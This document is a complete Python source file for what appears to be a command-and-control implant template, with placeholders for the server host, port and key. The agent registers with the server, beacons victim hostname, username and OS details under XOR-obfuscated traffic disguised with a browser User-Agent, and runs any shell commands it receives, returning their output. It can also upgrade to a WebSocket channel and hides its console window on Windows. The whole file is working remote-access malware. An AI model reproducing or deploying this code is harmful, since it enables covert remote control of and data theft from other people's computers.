#!/usr/bin/env python3
import json
import platform
import subprocess
import os
import getpass
import socket
import base64
import sys
import urllib.request
import urllib.error
import ssl
import time
import random

SERVER_HOST = "{{C2_HOST}}"
SERVER_PORT = {{C2_PORT}}
C2_SCHEME = "{{C2_SCHEME}}"
BEACON_INTERVAL = {{BEACON_INTERVAL}}
BEACON_JITTER = {{BEACON_JITTER}}
VERIFY_SSL = {{VERIFY_SSL}}

BASE_URL = f"{C2_SCHEME}://{SERVER_HOST}:{SERVER_PORT}"


def simple_encrypt(data: str) -> str:
    key = b'{{ENCRYPTION_KEY}}'
    encoded = data.encode()
    encrypted = bytes([encoded[i] ^ key[i % len(key)] for i in range(len(encoded))])
    return base64.b64encode(encrypted).decode()


def simple_decrypt(data: str) -> str:
    key = b'{{ENCRYPTION_KEY}}'
    decoded = base64.b64decode(data.encode())
    decrypted = bytes([decoded[i] ^ key[i % len(key)] for i in range(len(decoded))])
    return decrypted.decode()


def calculate_sleep_time(base_interval: int, jitter_percent: int) -> float:
    if jitter_percent <= 0 or jitter_percent > 100:
        return float(base_interval)
    jitter_amount = base_interval * (jitter_percent / 100.0)
    min_sleep = base_interval - jitter_amount
    max_sleep = base_interval + jitter_amount
    return random.uniform(max(0, min_sleep), max_sleep)


def get_metadata():
    return {
        'hostname': socket.gethostname(),
        'username': getpass.getuser(),
        'os': platform.system(),
        'os_version': platform.version(),
        'architecture': platform.machine(),
        'python_version': platform.python_version()
    }


def execute_command(command: str) -> str:
    try:
        if command.startswith('cd '):
            directory = command[3:].strip()
            os.chdir(directory)
            return f"Changed directory to {os.getcwd()}"
        result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30, cwd=os.getcwd())
        output = result.stdout + result.stderr
        return output if output else "Command executed successfully (no output)"
    except subprocess.TimeoutExpired:
        return "Command timeout"
    except Exception as e:
        return f"Error: {str(e)}"


def http_request(url: str, data: str = None) -> str:
    ctx = None
    if not VERIFY_SSL and C2_SCHEME == 'https':
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    if data is not None:
        req = urllib.request.Request(url, data=data.encode(), headers=headers, method='POST')
    else:
        req = urllib.request.Request(url, headers=headers, method='GET')
    try:
        if ctx:
            response = urllib.request.urlopen(req, context=ctx, timeout=60)
        else:
            response = urllib.request.urlopen(req, timeout=60)
        return response.read().decode()
    except Exception:
        return ""


def connect_to_server():
    beacon_interval = BEACON_INTERVAL
    beacon_jitter = BEACON_JITTER
    agent_id = None
    pending_results = []

    while True:
        try:
            if not agent_id:
                metadata = get_metadata()
                metadata['mode'] = 'beacon'
                metadata['beacon_interval'] = beacon_interval
                metadata['beacon_jitter'] = beacon_jitter
                register_msg = {'type': 'register', 'metadata': metadata}
                encrypted = simple_encrypt(json.dumps(register_msg))
                response = http_request(f"{BASE_URL}/submit-form", encrypted)
                if response:
                    decrypted = simple_decrypt(response)
                    data = json.loads(decrypted)
                    if data.get('type') in ['registered', 'checkin_ack']:
                        agent_id = data.get('agent_id', '')
                if not agent_id:
                    time.sleep(5)
                    continue

            # Checkin with results
            checkin_msg = {
                'type': 'checkin',
                'agent_id': agent_id,
                'metadata': get_metadata(),
                'results': pending_results
            }
            checkin_msg['metadata']['mode'] = 'beacon'
            checkin_msg['metadata']['beacon_interval'] = beacon_interval
            encrypted = simple_encrypt(json.dumps(checkin_msg))
            response = http_request(f"{BASE_URL}/api/v1/update", encrypted)
            pending_results = []

            if response:
                decrypted = simple_decrypt(response)
                data = json.loads(decrypted)

                if data.get('type') == 'registered':
                    agent_id = data.get('agent_id', '')
                    continue

                if data.get('type') == 'commands':
                    for cmd_data in data.get('commands', []):
                        command = cmd_data.get('command', '')
                        if command.startswith('__set_interval:'):
                            try:
                                beacon_interval = int(command.split(':')[1])
                            except (ValueError, IndexError):
                                pass
                            continue
                        if command == '__kill':
                            sys.exit(0)
                        if command.startswith('__upgrade_ws:'):
                            try:
                                ws_data = json.loads(command.split(':', 1)[1])
                                _upgrade_to_websocket(agent_id, ws_data.get('ws_host'), ws_data.get('ws_port'))
                                return
                            except Exception:
                                pending_results.append({
                                    'type': 'response',
                                    'output': 'WebSocket upgrade failed',
                                    'command': 'upgrade_ws',
                                    'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')
                                })
                            continue
                        if command:
                            output = execute_command(command)
                            pending_results.append({
                                'type': 'response',
                                'output': output,
                                'command': command,
                                'timestamp': time.strftime('%Y-%m-%dT%H:%M:%S')
                            })

            sleep_time = calculate_sleep_time(beacon_interval, beacon_jitter)
            time.sleep(sleep_time)

        except Exception:
            time.sleep(5)


def _upgrade_to_websocket(agent_id, ws_host, ws_port):
    try:
        import asyncio
        import websockets

        async def ws_connect():
            uri = f"ws://{ws_host}:{ws_port}"
            async with websockets.connect(uri, max_size=10485760) as websocket:
                checkin_msg = {'type': 'checkin', 'agent_id': agent_id, 'metadata': get_metadata()}
                encrypted = simple_encrypt(json.dumps(checkin_msg))
                await websocket.send(encrypted)
                response = await websocket.recv()
                decrypted = simple_decrypt(response)
                reg_data = json.loads(decrypted)
                if reg_data.get('type') in ['registered', 'checkin_ack']:
                    async for message in websocket:
                        try:
                            decrypted = simple_decrypt(message)
                            data = json.loads(decrypted)
                            if data.get('type') == 'command':
                                output = execute_command(data.get('command', ''))
                                resp = {'type': 'response', 'output': output}
                                await websocket.send(simple_encrypt(json.dumps(resp)))
                            elif data.get('type') == 'kill':
                                sys.exit(0)
                        except Exception:
                            pass
        asyncio.run(ws_connect())
    except (ImportError, Exception):
        pass


if __name__ == '__main__':
    if sys.platform == 'win32':
        try:
            import ctypes
            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        except Exception:
            pass
    try:
        connect_to_server()
    except KeyboardInterrupt:
        pass
